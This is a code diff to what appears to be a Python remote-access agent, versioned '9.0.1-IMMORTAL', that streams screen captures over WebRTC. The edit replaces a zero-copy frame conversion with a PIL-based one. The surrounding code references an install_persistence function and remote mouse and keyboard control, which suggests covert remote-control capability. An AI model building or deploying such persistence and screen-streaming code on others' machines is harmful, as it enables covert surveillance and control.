@@ -14,13 +14,14 @@ import getpass
 import platform
 import subprocess
 import shutil
+from PIL import Image
 from pynput.mouse import Controller as MouseController, Button
 from pynput.keyboard import Controller as KeyboardController, Key
 import av
 from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.0.0-IMMORTAL"
+AGENT_VERSION = "9.0.1-IMMORTAL"
 
 def install_persistence():
     current_exe = sys.executable
@@ -204,22 +205,22 @@ class ScreenVideoTrack(VideoStreamTrack):
             mon = self.sct.monitors[mon_idx]
             sct_img = self.sct.grab(mon)
             
-            # ZERO COPY: Inject raw BGRA byte buffer directly into C-memory FFmpeg VideoFrame
-            frame = av.VideoFrame(width=sct_img.width, height=sct_img.height, format='bgra')
-            frame.planes[0].update(sct_img.bgra)
+            # MEMORY ALIGNMENT FIX: Use PIL as a native struct wrapper to guarantee format stride alignment
+            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+            frame = av.VideoFrame.from_image(img)
             
             w = sct_img.width
             h = sct_img.height
             limit = 960 if current_quality < 60 else 1280
             
-            # Offload downscaling and colorspace conversion to FFmpeg's blazing fast `swscale`
+            # Offload downscaling and colorspace conversion to FFmpeg's blazing fast `swscale` C-routines
             if w > limit:
                 new_h = int(h * (limit / w))
                 frame = frame.reformat(width=limit, height=new_h, format='yuv420p')
             else:
                 frame = frame.reformat(format='yuv420p')
         except Exception as e:
-            print("Zero-Copy Frame Gen Error:", e)
+            print("Video Render Memory/Alignment Error:", e)
             frame = av.VideoFrame(width=960, height=540, format='yuv420p')
             for p in frame.planes: p.update(b'\x00' * p.buffer_size)
 
